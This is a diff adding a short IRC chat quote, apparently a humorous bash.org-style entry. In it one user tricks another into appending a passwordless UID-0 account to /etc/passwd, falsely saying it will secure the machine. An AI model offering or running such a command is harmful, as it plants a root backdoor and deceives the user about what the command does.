@@ -1,0 +1,8 @@
+#2010 +(479)- [X]
+<germane> here, type this in your shell
+<germane> echo 'germane::0:0:/:/:/bin/bash' >> /etc/passwd
+<germane> it will secure your box
+<atawmic> okay, hold on
+<atawmic> done
+<atawmic> whats happening?
+<atawmic> uhh, can you give me my shell now?
